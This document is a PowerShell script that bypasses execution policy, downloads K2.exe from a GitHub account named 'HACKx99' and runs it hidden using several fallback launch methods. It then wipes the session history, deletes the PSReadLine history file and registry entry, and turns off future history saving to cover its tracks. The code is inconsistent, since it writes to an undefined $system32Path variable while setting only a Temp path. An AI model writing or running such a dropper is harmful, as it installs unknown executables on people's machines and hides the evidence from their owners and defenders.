# PowerShell Script to Download, Save to System32, Run EXE Silently, and Clear History
# WARNING: This script requires Administrator privileges to write to System32.

try {
    # Bypass execution policy
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue

    # Use RAW GitHub URL for direct download
    $exeUrl = "https://github.com/HACKx99/WebSite/raw/main/K2.exe"
     $tempPath = "C:\Windows\Temp\K2.exe"
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    Write-Output "Downloading EXE from GitHub..."
    
    # Download the EXE to System32
    Invoke-WebRequest -Uri $exeUrl -OutFile $system32Path -UseBasicParsing

    # Verify download
    if (Test-Path $system32Path) {
        Write-Output "EXE saved to System32 successfully"
        
        # Wait to ensure file is completely written
        Start-Sleep -Seconds 3
        
        # Method 1: Start Process with proper parameters
        Write-Output "Attempting to run EXE..."
        $process = Start-Process -FilePath $system32Path -WindowStyle Hidden -PassThru
        
        # Wait and check if process is running
        Start-Sleep -Seconds 2
        if ($process.HasExited -eq $false) {
            Write-Output "EXE is running successfully (PID: $($process.Id))"
        } else {
            Write-Warning "Process started but exited quickly, trying alternative method..."
            
            # Method 2: Use cmd to start the process
            cmd.exe /c start "" /MIN "$system32Path"
            Start-Sleep -Seconds 2
        }
        
        # Method 3: Check if any K2 process is running
        $runningProcesses = Get-Process -Name "K2" -ErrorAction SilentlyContinue
        if ($runningProcesses) {
            Write-Output "EXE confirmed running (Processes: $($runningProcesses.Count))"
        } else {
            # Method 4: Try using Invoke-Item
            Write-Output "Trying Invoke-Item method..."
            Invoke-Item -Path $system32Path
            Start-Sleep -Seconds 2
        }
        
        # Final verification
        $finalCheck = Get-Process -Name "K2" -ErrorAction SilentlyContinue
        if ($finalCheck) {
            Write-Output "✓ EXE successfully running in background (no visible UI)"
        } else {
            Write-Warning "! EXE may not be running - check manually in Task Manager"
        }
    } else {
        throw "Download failed - file not found at $system32Path"
    }

    # Forcefully clear PowerShell history
    Write-Output "Clearing PowerShell history..."
    
    # Clear current session history
    Clear-History -ErrorAction SilentlyContinue
    
    # Delete history file
    if (Test-Path $historyPath) {
        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
        Write-Output "History file removed forcefully"
    }
    
    # Disable future history saving
    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
    
    # Clear registry history (FIXED TYPO: SilentlyContinue)
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\PowerShell\PSReadLine" -Name "ConsoleHostHistory" -ErrorAction SilentlyContinue

    Write-Output "PowerShell history cleared completely"

} catch {
    Write-Error "Error: $($_.Exception.Message)"
}

